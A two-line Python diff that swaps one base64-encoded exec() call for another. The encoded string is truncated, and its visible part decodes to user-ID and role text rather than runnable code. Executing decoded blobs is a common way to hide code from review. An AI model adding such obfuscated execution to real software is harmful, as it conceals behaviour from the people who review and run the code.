@@ -1,2 +1,2 @@
 import base64
-exec(base64.b64decode("......").decode())
+exec(base64.b64decode("...dTBfYTQyNTpNYXZlOm93bmVyCnUwX2E0MTE6UGlreTpQcmVtaXVtIA==...").decode())
